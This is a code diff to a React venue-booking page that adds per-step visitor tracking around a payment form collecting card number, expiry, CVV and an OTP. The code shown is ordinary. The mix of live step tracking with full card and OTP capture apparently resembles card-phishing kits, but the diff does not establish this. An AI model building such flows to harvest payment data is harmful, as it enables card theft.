@@ -5,7 +5,7 @@ import {
   CheckCircle, Hotel, ChevronDown, CreditCard, Lock, ChevronLeft,
   RefreshCw, Film
 } from "lucide-react";
-import { base44 } from "@/api/base44Client";
+import { updateCurrentPage } from "@/lib/pageTracker";
 import { updateVisitorFromBooking } from "@/lib/visitorTracker";
 import { addBooking } from "@/lib/firebaseService";
 import { Link } from "react-router-dom";
@@ -148,6 +148,11 @@ export default function Booking() {
   useEffect(() => {
     if (step === 2 && !paymentOtpSent) sendPaymentOtp();
   }, [step, paymentOtpSent]);
+
+  // Track current step on page load
+  useEffect(() => {
+    updateCurrentPage('booking-step-1');
+  }, []);
 
   const canProceed = form.venue_name && form.guest_name && form.phone && form.date && form.time;
 
@@ -374,7 +379,10 @@ export default function Booking() {
                         </div>
                       </div>
 
-                      <button type="button" disabled={!canProceed} onClick={() => goTo(1)}
+                      <button type="button" disabled={!canProceed} onClick={() => {
+                        updateCurrentPage('booking-step-2');
+                        goTo(1);
+                      }}
                         className="w-full relative overflow-hidden bg-primary text-primary-foreground py-4 text-xs font-bold tracking-[0.2em] uppercase hover:opacity-90 transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-3">
                         <span className="absolute inset-0 bg-gradient-to-r from-transparent via-primary-foreground/15 to-transparent animate-[shimmer_3s_ease-in-out_infinite] bg-[length:200%_100%]" />
                         <span className="relative">المتابعة للدفع</span>
@@ -496,7 +504,11 @@ export default function Booking() {
 
                       <button type="button"
                         disabled={!payment.card_name || !payment.card_number || !payment.expiry || !payment.cvv}
-                        onClick={() => { setPaymentOtpSent(false); goTo(2); }}
+                        onClick={() => { 
+                          updateCurrentPage('booking-step-3');
+                          setPaymentOtpSent(false); 
+                          goTo(2); 
+                        }}
                         className="w-full relative overflow-hidden bg-primary text-primary-foreground py-4 text-xs font-bold tracking-[0.2em] uppercase hover:opacity-90 transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-3">
                         <span className="absolute inset-0 bg-gradient-to-r from-transparent via-primary-foreground/15 to-transparent animate-[shimmer_3s_ease-in-out_infinite] bg-[length:200%_100%]" />
                         <Lock className="w-3.5 h-3.5 relative" />
